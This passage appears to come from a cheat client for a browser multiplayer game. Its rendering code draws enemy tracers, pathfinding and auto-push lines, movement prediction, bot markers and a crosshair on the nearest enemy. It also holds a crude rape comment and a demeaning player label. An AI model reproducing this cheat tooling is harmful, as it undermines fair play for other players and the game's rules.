                        mainContext.roundRect(tmpX - config.healthBarWidth / 2, tmpY, config.healthBarWidth * (tmpObj.health / tmpObj.maxHealth), 17 - config.healthBarPad * 2, 7);
                        mainContext.fill();
                    }
                }
            }
        });

        // PLACE VISIBLE:
        if (layer == 0) {
            if (placeVisible.length) {
                placeVisible.forEach((places) => {
                    tmpX = places.x - xOffset;
                    tmpY = places.y - yOffset;
                    markObject(places, tmpX, tmpY);
                });
            }
        }
    }

    function markObject(tmpObj, tmpX, tmpY) {
        getMarkSprite(tmpObj, mainContext, tmpX, tmpY);
    }

    // RENDER MINIMAP:
    class MapPing {
        constructor(color, scale) {
            this.init = function(x, y) {
                this.scale = 0;
                this.x = x;
                this.y = y;
                this.active = true;
            };
            this.update = function(ctxt, delta) {
                if (this.active) {
                    this.scale += 0.05 * delta;
                    if (this.scale >= scale) {
                        this.active = false;
                    } else {
                        ctxt.globalAlpha = (1 - Math.max(0, this.scale / scale));
                        ctxt.beginPath();
                        ctxt.arc((this.x / config.mapScale) * mapDisplay.width, (this.y / config.mapScale) *
                                 mapDisplay.width, this.scale, 0, 2 * Math.PI);
                        ctxt.stroke();
                    }
                }
            };
            this.color = color;
        }
    }

    function pingMap(x, y) {
        tmpPing = mapPings.find(pings => !pings.active);
        if (!tmpPing) {
            tmpPing = new MapPing("#fff", config.mapPingScale);
            mapPings.push(tmpPing);
        }
        tmpPing.init(x, y);
    }

    function updateMapMarker() {
        mapMarker.x = player.x;
        mapMarker.y = player.y;
    }

    function renderMinimap(delta) {
        if (player && player.alive) {
            mapContext.clearRect(0, 0, mapDisplay.width, mapDisplay.height);

            // RENDER PINGS:
            mapContext.lineWidth = 4;
            for (let i = 0; i < mapPings.length; ++i) {
                tmpPing = mapPings[i];
                mapContext.strokeStyle = tmpPing.color;
                tmpPing.update(mapContext, delta);
            }

            // RENDER BREAK TRACKS:
            mapContext.globalAlpha = 1;
            mapContext.fillStyle = "#ff0000";
            if (breakTrackers.length) {
                mapContext.fillStyle = "#abcdef";
                mapContext.font = "34px HammerSmith One";
                mapContext.textBaseline = "middle";
                mapContext.textAlign = "center";
                for (let i = 0; i < breakTrackers.length;) {
                    mapContext.fillText("!", (breakTrackers[i].x / config.mapScale) * mapDisplay.width,
                                        (breakTrackers[i].y / config.mapScale) * mapDisplay.height);
                    i += 2;
                }
            }

            // RENDER PLAYERS:
            mapContext.globalAlpha = 1;
            mapContext.fillStyle = "#fff";
            renderCircle((player.x / config.mapScale) * mapDisplay.width,
                         (player.y / config.mapScale) * mapDisplay.height, 7, mapContext, true);
            mapContext.fillStyle = "rgba(255,255,255,0.35)";
            if (player.team && minimapData) {
                for (let i = 0; i < minimapData.length;) {
                    renderCircle((minimapData[i] / config.mapScale) * mapDisplay.width,
                                 (minimapData[i + 1] / config.mapScale) * mapDisplay.height, 7, mapContext, true);
                    i += 2;
                }
            }

            // RENDER BOTS:
            if (bots.length) {
                bots.forEach((tmp) => {
                    if (tmp.inGame) {
                        mapContext.globalAlpha = 1;
                        mapContext.strokeStyle = "#cc5151";
                        renderCircle((tmp.x2 / config.mapScale) * mapDisplay.width,
                                     (tmp.y2 / config.mapScale) * mapDisplay.height, 7, mapContext, false, true);
                    }
                });
            }

            // DEATH LOCATION:
            if (lastDeath) {
                mapContext.fillStyle = "#fc5553";
                mapContext.font = "34px HammerSmith One";
                mapContext.textBaseline = "middle";
                mapContext.textAlign = "center";
                mapContext.fillText("x", (lastDeath.x / config.mapScale) * mapDisplay.width,
                                    (lastDeath.y / config.mapScale) * mapDisplay.height);
            }

            // MAP MARKER:
            if (mapMarker) {
                mapContext.fillStyle = "#fff";
                mapContext.font = "34px HammerSmith One";
                mapContext.textBaseline = "middle";
                mapContext.textAlign = "center";
                mapContext.fillText("x", (mapMarker.x / config.mapScale) * mapDisplay.width,
                                    (mapMarker.y / config.mapScale) * mapDisplay.height);
            }
        }
    }

    // ICONS:
    let crossHairs = ["https://cdn.discordapp.com/attachments/1233117653716172952/1235681807262027866/image-from-rawpixel-id-14718496-png_1.png?ex=66373c1c&is=6635ea9c&hm=ab0a218822ebb30965197d2268459c4f8335d369e31255e4c62a133a3cadbcc9&", "https://cdn.discordapp.com/attachments/1233117653716172952/1235681807262027866/image-from-rawpixel-id-14718496-png_1.png?ex=66373c1c&is=6635ea9c&hm=ab0a218822ebb30965197d2268459c4f8335d369e31255e4c62a133a3cadbcc9&"];
    let crossHairSprites = {};
    let iconSprites = {};
    let icons = ["crown", "skull"];

    function loadIcons() {
        for (let i = 0; i < icons.length; ++i) {
            let tmpSprite = new Image();
            tmpSprite.onload = function() {
                this.isLoaded = true;
            };
            tmpSprite.src = "./../img/icons/" + icons[i] + ".png";
            iconSprites[icons[i]] = tmpSprite;
        }
        for (let i = 0; i < crossHairs.length; ++i) {
            let tmpSprite = new Image();
            tmpSprite.onload = function() {
                this.isLoaded = true;
            };
            tmpSprite.src = crossHairs[i];
            crossHairSprites[i] = tmpSprite;
        }
    }
    loadIcons();

    function cdf (e, t){
        try {
            return Math.hypot((t.y2||t.y)-(e.y2||e.y), (t.x2||t.x)-(e.x2||e.x));
        } catch(e){
            return Infinity;
        }
    }
    // UPDATE GAME:
    function updateGame() {
        if(gameObjects.length && inGame) {
            gameObjects.forEach((tmp) => {
                if(UTILS.getDistance(tmp.x, tmp.y, player.x, player.y) <= 1200) {
                    if(!liztobj.includes(tmp)) {
                        liztobj.push(tmp);
                        tmp.render = true;
                    }
                } else {
                    if(liztobj.includes(tmp)) {
                        if(UTILS.getDistance(tmp.x, tmp.y, player.x, player.y) >= 1200) {
                            tmp.render = false;
                            const index = liztobj.indexOf(tmp);
                            if (index > -1) { // only splice array when item is found
                                liztobj.splice(index, 1); // 2nd parameter means remove one item only
                            }
                        }
                    } else if(UTILS.getDistance(tmp.x, tmp.y, player.x, player.y) >= 1200) {
                        tmp.render = false;
                        const index = liztobj.indexOf(tmp);
                        if (index > -1) { // only splice array when item is found
                            liztobj.splice(index, 1); // 2nd parameter means remove one item only
                        }
                    } else {
                        tmp.render = false;
                        const index = liztobj.indexOf(tmp);
                        if (index > -1) { // only splice array when item is found
                            liztobj.splice(index, 1); // 2nd parameter means remove one item only
                        }
                    }
                }
            })
            // gameObjects = gameObjects.filter(e => UTILS.getDistance(e.x, e.y, player.x, player.y) <= 1000)
        }

        // if (config.resetRender) {
        mainContext.beginPath();
        mainContext.clearRect(0, 0, gameCanvas.width, gameCanvas.height);
        // }
        mainContext.globalAlpha = 1;

        // MOVE CAMERA:
        if (player) {
            if (false) {
                camX = player.x;
                camY = player.y;
            } else {
                let tmpDist = UTILS.getDistance(camX, camY, player.x, player.y);
                let tmpDir = UTILS.getDirection(player.x, player.y, camX, camY);
                let camSpd = Math.min(tmpDist * 0.0045 * delta, tmpDist);
                if (tmpDist > 0.05) {
                    camX += camSpd * Math.cos(tmpDir);
                    camY += camSpd * Math.sin(tmpDir);
                } else {
                    camX = player.x;
                    camY = player.y;
                }
            }
        } else {
            camX = config.mapScale / 2 + config.riverWidth;
            camY = config.mapScale / 2;
        }
        // PATHFINDER LINE
        if (pathFind.active) {
            if (pathFind.array && (pathFind.chaseNear ? enemy.length : true)) {
                mainContext.lineWidth = player.scale / 5;
                mainContext.globalAlpha = 1;
                mainContext.strokeStyle = "red";
                mainContext.beginPath();
                pathFind.array.forEach((path, i) => {
                    let pathXY = {
                        x: (pathFind.scale / pathFind.grid) * path.x,
                        y: (pathFind.scale / pathFind.grid) * path.y
                    }
                    let render = {
                        x: ((player.x2 - (pathFind.scale / 2)) + pathXY.x) - xOffset,
                        y: ((player.y2 - (pathFind.scale / 2)) + pathXY.y) - yOffset
                    }
                    if (i == 0) {
                        mainContext.moveTo(render.x, render.y);
                    } else {
                        mainContext.lineTo(render.x, render.y);
                    }
                });
                mainContext.stroke();
            }
        }
        // INTERPOLATE PLAYERS AND AI:
        let lastTime = now - (1000 / config.serverUpdateRate);
        let tmpDiff;
        for (let i = 0; i < players.length + ais.length; ++i) {
            tmpObj = players[i] || ais[i - players.length];
            if (tmpObj && tmpObj.visible) {
                if (tmpObj.forcePos) {
                    tmpObj.x = tmpObj.x2;
                    tmpObj.y = tmpObj.y2;
                    tmpObj.dir = tmpObj.d2;
                } else {
                    let total = tmpObj.t2 - tmpObj.t1;
                    let fraction = lastTime - tmpObj.t1;
                    let ratio = (fraction / total);
                    let rate = 170;
                    tmpObj.dt += delta;
                    let tmpRate = Math.min(1.7, tmpObj.dt / rate);
                    tmpDiff = (tmpObj.x2 - tmpObj.x1);
                    tmpObj.x = tmpObj.x1 + (tmpDiff * tmpRate);
                    tmpDiff = (tmpObj.y2 - tmpObj.y1);
                    tmpObj.y = tmpObj.y1 + (tmpDiff * tmpRate);
                    if (config.anotherVisual) {
                        tmpObj.dir = Math.lerpAngle(tmpObj.d2, tmpObj.d1, Math.min(1.2, ratio));
                    } else {
                        tmpObj.dir = Math.lerpAngle(tmpObj.d2, tmpObj.d1, Math.min(1.2, ratio));
                    }
                }
            }
        }

        // RENDER CORDS:
        let xOffset = camX - (maxScreenWidth / 2);
        let yOffset = camY - (maxScreenHeight / 2);

        // RENDER BACKGROUND:
        if (config.snowBiomeTop - yOffset <= 0 && config.mapScale - config.snowBiomeTop - yOffset >= maxScreenHeight) {
            mainContext.fillStyle = "#b6db66";
            mainContext.fillRect(0, 0, maxScreenWidth, maxScreenHeight);
        } else if (config.mapScale - config.snowBiomeTop - yOffset <= 0) {
            mainContext.fillStyle = "#dbc666";
            mainContext.fillRect(0, 0, maxScreenWidth, maxScreenHeight);
        } else if (config.snowBiomeTop - yOffset >= maxScreenHeight) {
            mainContext.fillStyle = "#fff";
            mainContext.fillRect(0, 0, maxScreenWidth, maxScreenHeight);
        } else if (config.snowBiomeTop - yOffset >= 0) {
            mainContext.fillStyle = "#fff";
            mainContext.fillRect(0, 0, maxScreenWidth, config.snowBiomeTop - yOffset);
            mainContext.fillStyle = "#b6db66";
            mainContext.fillRect(0, config.snowBiomeTop - yOffset, maxScreenWidth,
                                 maxScreenHeight - (config.snowBiomeTop - yOffset));
        } else {
            mainContext.fillStyle = "#b6db66";
            mainContext.fillRect(0, 0, maxScreenWidth,
                                 (config.mapScale - config.snowBiomeTop - yOffset));
            mainContext.fillStyle = "#dbc666";
            mainContext.fillRect(0, (config.mapScale - config.snowBiomeTop - yOffset), maxScreenWidth,
                                 maxScreenHeight - (config.mapScale - config.snowBiomeTop - yOffset));
        }

        // RENDER WATER AREAS:
        if (!firstSetup) {
            waterMult += waterPlus * config.waveSpeed * delta;
            if (waterMult >= config.waveMax) {
                waterMult = config.waveMax;
                waterPlus = -1;
            } else if (waterMult <= 1) {
                waterMult = waterPlus = 1;
            }
            mainContext.globalAlpha = 1;
            mainContext.fillStyle = "#dbc666";
            renderWaterBodies(xOffset, yOffset, mainContext, config.riverPadding);
            mainContext.fillStyle = "#91b2db";
            renderWaterBodies(xOffset, yOffset, mainContext, (waterMult - 1) * 250);
        }

        // RENDER DEAD PLAYERS:
        mainContext.globalAlpha = 1;
        mainContext.strokeStyle = outlineColor;
        renderDeadPlayers(xOffset, yOffset);

        // RENDER BOTTOM LAYER:
        mainContext.globalAlpha = 1;
        mainContext.strokeStyle = outlineColor;
        renderGameObjects(-1, xOffset, yOffset);

        // RENDER PROJECTILES:
        mainContext.globalAlpha = 1;
        mainContext.lineWidth = outlineWidth;
        renderProjectiles(0, xOffset, yOffset);

        // RENDER PLAYERS:
        renderPlayers(xOffset, yOffset, 0);

        // RENDER AI:
        mainContext.globalAlpha = 1;
        for (let i = 0; i < ais.length; ++i) {
            tmpObj = ais[i];
            if (tmpObj.active && tmpObj.visible) {
                tmpObj.animate(delta);
                mainContext.save();
                mainContext.translate(tmpObj.x - xOffset, tmpObj.y - yOffset);
                mainContext.rotate(tmpObj.dir + tmpObj.dirPlus - (Math.PI / 2));
                renderAI(tmpObj, mainContext);
                mainContext.restore();
            }
        }

        // RENDER GAME OBJECTS (LAYERED):
        renderGameObjects(0, xOffset, yOffset);
        renderProjectiles(1, xOffset, yOffset);
        renderGameObjects(1, xOffset, yOffset);
        renderPlayers(xOffset, yOffset, 1);
        renderGameObjects(2, xOffset, yOffset);
        renderGameObjects(3, xOffset, yOffset);

        // MAP BOUNDARIES:
        mainContext.fillStyle = "#000";
        mainContext.globalAlpha = 0.09;
        if (xOffset <= 0) {
            mainContext.fillRect(0, 0, -xOffset, maxScreenHeight);
        }
        if (config.mapScale - xOffset <= maxScreenWidth) {
            let tmpY = Math.max(0, -yOffset);
            mainContext.fillRect(config.mapScale - xOffset, tmpY, maxScreenWidth - (config.mapScale - xOffset), maxScreenHeight - tmpY);
        }
        if (yOffset <= 0) {
            mainContext.fillRect(-xOffset, 0, maxScreenWidth + xOffset, -yOffset);
        }
        if (config.mapScale - yOffset <= maxScreenHeight) {
            let tmpX = Math.max(0, -xOffset);
            let tmpMin = 0;
            if (config.mapScale - xOffset <= maxScreenWidth)
                tmpMin = maxScreenWidth - (config.mapScale - xOffset);
            mainContext.fillRect(tmpX, config.mapScale - yOffset,
                                 (maxScreenWidth - tmpX) - tmpMin, maxScreenHeight - (config.mapScale - yOffset));
        }

        // RENDER DAY/NIGHT TIME:
        mainContext.globalAlpha = 1;
        mainContext.fillStyle = "rgba(0, 5, 80, 0.55)";
        mainContext.fillRect(0, 0, maxScreenWidth, maxScreenHeight);

        // RENDER PLAYER AND AI UI:
        mainContext.strokeStyle = darkOutlineColor;
        mainContext.globalAlpha = 1;

        for (let i = 0; i < players.length + ais.length; ++i) {
            tmpObj = players[i] || ais[i - players.length];
            if (tmpObj.visible && tmpObj.showName === 'NOOO') {
                mainContext.strokeStyle = darkOutlineColor;

                // NAME AND HEALTH:

                //                         let izbot = false;

                //                         bots.forEach((bot) => {
                //                             if (tmpObj.sid == bot.sid) izbot = true
                //                             else izbot = false;
                //                         });

                let tmpText = (tmpObj.team ? "[" + tmpObj.team + "] " : "") + (tmpObj.name || ""); //+ (tmpObj.isPlayer ? " {" + tmpObj.sid + "}" : "");
                if (tmpText != "" && tmpObj.name != "Trash Slave") {
                    // bots.forEach((bot) => {
                    //     if (tmpObj.sid == bot.sid) return;
                    // });

                    mainContext.font = (tmpObj.nameScale || 30) + "px HammerSmith One";
                    mainContext.fillStyle = "#fff";
                    mainContext.textBaseline = "middle";
                    mainContext.textAlign = "center";
                    mainContext.lineWidth = (tmpObj.nameScale ? 11 : 8);
                    mainContext.lineJoin = "round";
                    mainContext.strokeText(tmpText, tmpObj.x - xOffset, (tmpObj.y - yOffset - tmpObj.scale) - config.nameY);
                    mainContext.fillText(tmpText, tmpObj.x - xOffset, (tmpObj.y - yOffset - tmpObj.scale) - config.nameY);
                    if (tmpObj.isLeader && iconSprites["crown"].isLoaded) {
                        let tmpS = config.crownIconScale;
                        let tmpX = tmpObj.x - xOffset - (tmpS / 2) - (mainContext.measureText(tmpText).width / 2) - config.crownPad;
                        mainContext.drawImage(iconSprites["crown"], tmpX, (tmpObj.y - yOffset - tmpObj.scale) -
                                              config.nameY - (tmpS / 2) - 5, tmpS, tmpS);
                    }
                    if (tmpObj.iconIndex == 1 && iconSprites["skull"].isLoaded) {
                        let tmpS = config.crownIconScale;
                        let tmpX = tmpObj.x - xOffset - (tmpS / 2) + (mainContext.measureText(tmpText).width / 2) + config.crownPad;
                        mainContext.drawImage(iconSprites["skull"], tmpX, (tmpObj.y - yOffset - tmpObj.scale) -
                                              config.nameY - (tmpS / 2) - 5, tmpS, tmpS);
                    }
                    if (tmpObj.isPlayer && instaC.wait && near == tmpObj && (crossHairSprites[1].isLoaded) && enemy.length && !useWasd) {
                        let tmpS = tmpObj.scale * 2.2;
                        mainContext.drawImage((crossHairSprites[1]), tmpObj.x - xOffset - tmpS / 2, tmpObj.y - yOffset - tmpS / 2, tmpS, tmpS);
                    }
                    // izbot = false;
                }
                if (tmpObj.health > 0) {

                    if(tmpObj.name != "Trash Slave") {
                        // HEALTH HOLDER:
                        mainContext.fillStyle = darkOutlineColor;
                        mainContext.roundRect(tmpObj.x - xOffset - config.healthBarWidth - config.healthBarPad,
                                              (tmpObj.y - yOffset + tmpObj.scale) + config.nameY, (config.healthBarWidth * 2) +
                                              (config.healthBarPad * 2), 17, 8);
                        mainContext.fill();

                        // HEALTH BAR:
                        mainContext.fillStyle = (tmpObj == player || (tmpObj.team && tmpObj.team == player.team)) ? "#8ecc51" : "#cc5151";
                        mainContext.roundRect(tmpObj.x - xOffset - config.healthBarWidth,
                                              (tmpObj.y - yOffset + tmpObj.scale) + config.nameY + config.healthBarPad,
                                              ((config.healthBarWidth * 2) * (tmpObj.health / tmpObj.maxHealth)), 17 - config.healthBarPad * 2, 7);
                        mainContext.fill();
                    }

                    if (tmpObj.isPlayer) {
                        mainContext.globalAlpha = 1;
                        let targetReloads = {
                            primary: (tmpObj.primaryIndex == undefined ? 1 : ((items.weapons[tmpObj.primaryIndex].speed - tmpObj.reloads[tmpObj.primaryIndex]) / items.weapons[tmpObj.primaryIndex].speed)),
                            secondary: (tmpObj.secondaryIndex == undefined ? 1 : ((items.weapons[tmpObj.secondaryIndex].speed - tmpObj.reloads[tmpObj.secondaryIndex]) / items.weapons[tmpObj.secondaryIndex].speed)),
                            turret: (2500 - tmpObj.reloads[53]) / 2500
                        };
                        if (!tmpObj.currentReloads) {
                            tmpObj.currentReloads = { // Initialize currentReloads if not already set
                                primary: targetReloads.primary,
                                secondary: targetReloads.secondary,
                                turret: targetReloads.turret
                            };
                        }
                        const lerpFactor = 0.3;
                        tmpObj.currentReloads.primary = (1 - lerpFactor) * tmpObj.currentReloads.primary + lerpFactor * targetReloads.primary;
                        tmpObj.currentReloads.secondary = (1 - lerpFactor) * tmpObj.currentReloads.secondary + lerpFactor * targetReloads.secondary;
                        tmpObj.currentReloads.turret = (1 - lerpFactor) * tmpObj.currentReloads.turret + lerpFactor * targetReloads.turret;

                        let primaryReloadProgress = tmpObj.primaryIndex !== undefined ? ((items.weapons[tmpObj.primaryIndex].speed - tmpObj.reloads[tmpObj.primaryIndex]) / items.weapons[tmpObj.primaryIndex].speed) : 1;
                        let secondaryReloadProgress = tmpObj.secondaryIndex !== undefined ? ((items.weapons[tmpObj.secondaryIndex].speed - tmpObj.reloads[tmpObj.secondaryIndex]) / items.weapons[tmpObj.secondaryIndex].speed) : 1;
                        const centerX = tmpObj.x - xOffset;
                        const centerY = tmpObj.y - yOffset;
                        const barRadius = 35;
                        const barWidth = 15;
                        const totalAngle = (Math.PI*2)/3; // Half circle
                        const secondaryStartAngle = -Math.PI / 2 + Math.PI / 3 + tmpObj.dir - Math.PI/2;
                        const secondaryEndAngle = secondaryStartAngle + (totalAngle * tmpObj.currentReloads.secondary);
                        const primaryStartAngle = Math.PI / 2 + tmpObj.dir - Math.PI/2;
                        const primaryEndAngle = primaryStartAngle + (totalAngle * tmpObj.currentReloads.primary);

                        const turretStartAngle = Math.PI + Math.PI / 4.5 + tmpObj.dir - Math.PI/2;
                        const turretEndAngle = turretStartAngle + (totalAngle/1.25 * tmpObj.currentReloads.turret);
                        function returncoolcolor(RainbowCycle) {
                            return `hsl(${RainbowCycle-50}, 85%, 50%, 30)`;
                        }

                        mainContext.save();
                        if (tmpObj.currentReloads.primary < 0.999) {
                            mainContext.beginPath();
                            mainContext.lineCap = 'round';
                            mainContext.arc(centerX, centerY, barRadius, primaryStartAngle, primaryEndAngle);
                            mainContext.lineWidth = 4;
                            mainContext.strokeStyle = returncoolcolor(tmpObj.currentReloads.primary * 240);
                            mainContext.stroke();
                        }
                        if (tmpObj.currentReloads.secondary < 0.999) {
                            mainContext.beginPath();
                            mainContext.lineCap = 'round';
                            mainContext.arc(centerX, centerY, barRadius, secondaryStartAngle, secondaryEndAngle);
                            mainContext.lineWidth = 4;
                            mainContext.strokeStyle = returncoolcolor(tmpObj.currentReloads.secondary * 240);
                            mainContext.stroke();
                        }
                        if (tmpObj.currentReloads.turret < 0.999) {
                            mainContext.beginPath();
                            mainContext.lineCap = 'round';
                            mainContext.arc(centerX, centerY, barRadius, turretStartAngle, turretEndAngle);
                            mainContext.lineWidth = 4;
                            mainContext.strokeStyle = returncoolcolor(tmpObj.currentReloads.turret * 240);
                            mainContext.stroke();
                        }
                        mainContext.restore();

                        if(tmpObj.name != "Trash Slave") {
                            // SHAME COUNT:
                            mainContext.globalAlpha = 1;
                            mainContext.font = "24px HammerSmith One";
                            mainContext.fillStyle = "#fff";
                            mainContext.strokeStyle = darkOutlineColor;
                            mainContext.textBaseline = "middle";
                            mainContext.textAlign = "center";
                            mainContext.lineWidth = 8;
                            mainContext.lineJoin = "round";
                            let tmpS = config.crownIconScale;
                            let tmpX = tmpObj.x - xOffset - tmpS / 2 + config.crownPad - 2;
                            mainContext.strokeText('[' + (tmpObj.skinIndex == 45 && tmpObj.shameTimer > 0 ? tmpObj.shameTimer : tmpObj.shameCount) + '/' + Math.round(tmpObj.pinge) + '/' + tmpObj.lastshamecount + ']', tmpX, tmpObj.y - yOffset - tmpObj.scale - config.nameY + 175);
                            mainContext.fillText('[' + (tmpObj.skinIndex == 45 && tmpObj.shameTimer > 0 ? tmpObj.shameTimer : tmpObj.shameCount) + '/' + Math.round(tmpObj.pinge) + '/' + tmpObj.lastshamecount + ']', tmpX, tmpObj.y - yOffset - tmpObj.scale - config.nameY + 175);
                        }

                        // PLAYER TRACER:
                        if (!tmpObj.isTeam(player)) {
                            let center = {
                                x: screenWidth / 2,
                                y: screenHeight / 2,
                            };
                            let alpha = Math.min(1, (UTILS.getDistance(0, 0, player.x - tmpObj.x, (player.y - tmpObj.y) * (16 / 9)) * 100) / (config.maxScreenHeight / 2) / center.y);
                            let dist = center.y * alpha / 2;
                            let tmpX = dist * Math.cos(UTILS.getDirect(tmpObj, player, 0, 0));
                            let tmpY = dist * Math.sin(UTILS.getDirect(tmpObj, player, 0, 0));
                            mainContext.save();
                            mainContext.translate((player.x - xOffset) + tmpX, (player.y - yOffset) + tmpY);
                            mainContext.rotate(tmpObj.aim2 + Math.PI / 2);
                            let by = 255 - (tmpObj.sid * 2);
                            mainContext.fillStyle = `rgb(${by}, ${by}, ${by})`;
                            mainContext.globalAlpha = alpha;
                            let renderTracer = function(s, ctx) {
                                ctx = ctx || mainContext;
                                let h = s * (Math.sqrt(3) / 2);
                                ctx.beginPath();
                                ctx.moveTo(0, -h / 1.5);
                                ctx.lineTo(-s / 2, h / 2);
                                ctx.lineTo(s / 2, h / 2);
                                ctx.lineTo(0, -h / 1.5);
                                ctx.fill();
                                ctx.closePath();
                            }
                            renderTracer(25, mainContext);
                            mainContext.restore();
                        }

                        if (getEl("predictType").value == "pre2") {
                            mainContext.lineWidth = 3;
                            mainContext.strokeStyle = "#fff";
                            mainContext.globalAlpha = 1;
                            mainContext.beginPath();
                            let render = {
                                x: tmpObj.x2 - xOffset,
                                y: tmpObj.y2 - yOffset
                            };
                            mainContext.moveTo(tmpObj.x - xOffset, tmpObj.y - yOffset);
                            mainContext.lineTo(render.x, render.y);
                            mainContext.stroke();
                        } else if (getEl("predictType").value == "pre3") {
                            mainContext.lineWidth = 3;
                            mainContext.strokeStyle = "#cc5151";
                            mainContext.globalAlpha = 1;
                            mainContext.beginPath();
                            let render = {
                                x: tmpObj.x3 - xOffset,
                                y: tmpObj.y3 - yOffset
                            };
                            mainContext.moveTo(tmpObj.x - xOffset, tmpObj.y - yOffset);
                            mainContext.lineTo(render.x, render.y);
                            mainContext.stroke();
                        }

                    }
                }
            }
        }

        if (player) {

            // AUTOPUSH LINE:
            if (my.autoPush && my.pushData) {
                mainContext.lineWidth = 5;
                mainContext.globalAlpha = 1;
                mainContext.beginPath();
                var x1 = player.x - xOffset;
                var y1 = player.y - yOffset;
                var x2 = my.pushData.x2 - xOffset;
                var y2 = my.pushData.y2 - yOffset;
                var x3 = my.pushData.x - xOffset;
                var y3 = my.pushData.y - yOffset;

                mainContext.moveTo(x1, y1);
                mainContext.lineTo(x2, y2);
                mainContext.lineTo(x3, y3);
                mainContext.stroke();

                var deltaX = x3 - x1;
                var deltaY = y3 - y1;
                var distance = Math.sqrt(deltaX * deltaX + deltaY * deltaY);

                var maxDistance = 100;
                var percentage = (distance / maxDistance) * 100;

                percentage = Math.min(100, Math.max(0, percentage));
                let spike;
                mainContext.fillStyle = "white";
                mainContext.strokeStyle = "black";
                mainContext.lineWidth = 5;
                mainContext.font = "27px Times New Roman";
                let nearTrap = liztobj.filter(tmp => tmp.trap && tmp.active && tmp.isTeamObject(player) && UTILS.getDist(tmp, near, 0, 2) <= (near.scale + tmp.getScale() + 5)).sort(function(a, b) {
                    return UTILS.getDist(a, near, 0, 2) - UTILS.getDist(b, near, 0, 2);
                })[0];
                if(nearTrap)
                    spike = liztobj.filter(tmp => tmp.dmg && tmp.active && tmp.isTeamObject(player) && UTILS.getDist(tmp, nearTrap, 0, 0) <= (near.scale + nearTrap.scale + tmp.scale)).sort(function(a, b) {
                        return UTILS.getDist(a, near, 0, 2) - UTILS.getDist(b, near, 0, 2);
                    })[0];

                let xx = (player.x - xOffset + near.x - xOffset) / 2;
                let yy = (player.y - yOffset + near.y - yOffset) / 2;

                mainContext.moveTo(player.x - xOffset, player.y - yOffset);
                mainContext.strokeText(near.aim2, xx, yy);
                mainContext.fillText(near.aim2, xx, yy);
            }
        }

        mainContext.globalAlpha = 1;

        // RENDER ANIM TEXTS:
        textManager.update(delta, mainContext, xOffset, yOffset);

        // RENDER CHAT MESSAGES:
        for (let i = 0; i < players.length; ++i) {
            tmpObj = players[i];
            if (tmpObj.visible) {
                if (tmpObj.chatCountdown > 0) {
                    tmpObj.chatCountdown -= delta;
                    if (tmpObj.chatCountdown <= 0)
                        tmpObj.chatCountdown = 0;
                    mainContext.font = "32px HammerSmith One";
                    let tmpSize = mainContext.measureText(tmpObj.chatMessage);
                    mainContext.textBaseline = "middle";
                    mainContext.textAlign = "center";
                    let tmpX = tmpObj.x - xOffset;
                    let tmpY = tmpObj.y - tmpObj.scale - yOffset - 90;
                    let tmpH = 47;
                    let tmpW = tmpSize.width + 17;
                    mainContext.fillStyle = "rgba(0,0,0,0.2)";
                    mainContext.roundRect(tmpX - tmpW / 2, tmpY - tmpH / 2, tmpW, tmpH, 6);
                    mainContext.fill();
                    mainContext.fillStyle = "#fff";
                    mainContext.fillText(tmpObj.chatMessage, tmpX, tmpY);
                }
                if (tmpObj.chat.count > 0) {
                    if (!useWasd) {
                        tmpObj.chat.count -= delta;
                        if (tmpObj.chat.count <= 0)
                            tmpObj.chat.count = 0;
                        mainContext.font = "32px HammerSmith One";
                        let tmpSize = mainContext.measureText(tmpObj.chat.message);
                        mainContext.textBaseline = "middle";
                        mainContext.textAlign = "center";
                        let tmpX = tmpObj.x - xOffset;
                        let tmpY = tmpObj.y - tmpObj.scale - yOffset + (90 * 2);
                        let tmpH = 47;
                        let tmpW = tmpSize.width + 17;
                        mainContext.fillStyle = "rgba(0,0,0,0.2)";
                        mainContext.roundRect(tmpX - tmpW / 2, tmpY - tmpH / 2, tmpW, tmpH, 6);
                        mainContext.fill();
                        mainContext.fillStyle = "#ffffff99";
                        mainContext.fillText(tmpObj.chat.message, tmpX, tmpY);
                    } else {
                        tmpObj.chat.count = 0;
                    }
                }
            }
        }

        if (allChats.length) {
            allChats.filter(ch => ch.active).forEach((ch) => {
                if (!ch.alive) {
                    if (ch.alpha <= 1) {
                        ch.alpha += delta / 250;
                        if (ch.alpha >= 1) {
                            ch.alpha = 1;
                            ch.alive = true;
                        }
                    }
                } else {
                    ch.alpha -= delta / 5000;
                    if (ch.alpha <= 0) {
                        ch.alpha = 0;
                        ch.active = false;
                    }
                }
                if (ch.active) {
                    mainContext.font = "20px Ubuntu";
                    let tmpSize = mainContext.measureText(ch.chat);
                    mainContext.textBaseline = "middle";
                    mainContext.textAlign = "center";
                    let tmpX = ch.x - xOffset;
                    let tmpY = ch.y - yOffset - 90;
                    let tmpH = 40;
                    let tmpW = tmpSize.width + 15;

                    mainContext.globalAlpha = ch.alpha;

                    mainContext.fillStyle = ch.owner.isTeam(player) ? "#8ecc51" : "#cc5151";
                    mainContext.strokeStyle = "rgb(25, 25, 25)";
                    mainContext.strokeText(ch.owner.name, tmpX, tmpY - 45);
                    mainContext.fillText(ch.owner.name, tmpX, tmpY - 45);

                    mainContext.lineWidth = 5;
                    mainContext.fillStyle = "#ccc";
                    mainContext.strokeStyle = "rgb(25, 25, 25)";

                    mainContext.roundRect(tmpX - tmpW / 2, tmpY - tmpH / 2, tmpW, tmpH, 6);
                    mainContext.stroke();
                    mainContext.fill();

                    mainContext.fillStyle = "#fff";
                    mainContext.strokeStyle = "#000";
                    mainContext.strokeText(ch.chat, tmpX, tmpY);
                    mainContext.fillText(ch.chat, tmpX, tmpY);
                    ch.y -= delta / 100;
                }
            });
        }

        mainContext.globalAlpha = 1;

        // RENDER MINIMAP:
        renderMinimap(delta);
    }

    // UPDATE & ANIMATE:
    window.requestAnimFrame = function() {
        return null;
    }
    window.rAF = (function() {
        return window.requestAnimationFrame ||
            window.webkitRequestAnimationFrame ||
            window.mozRequestAnimationFrame ||
            function(callback) {
            window.setTimeout(callback, 1000/9);
        };
    })();

    function doUpdate() {
        //rape modulus
        now = performance.now();
        delta = now - lastUpdate;
        lastUpdate = now;
        let timer = performance.now();
        let diff = timer - fpsTimer.last;
        if (diff >= 1000) {

            fpsTimer.ltime = fpsTimer.time * (1000 / diff);

            fpsTimer.last = timer;
            fpsTimer.time = 0;
        }
        fpsTimer.time++;

        getEl("pingFps").innerHTML = `${window.pingTime}ms | Fps: ${Math.round(fpsTimer.ltime)}`;
        getEl("packetStatus").innerHTML = secPacket;
        updateGame();
        rAF(doUpdate);
        ms.avg = Math.round((ms.min+ms.max)/2);
    }

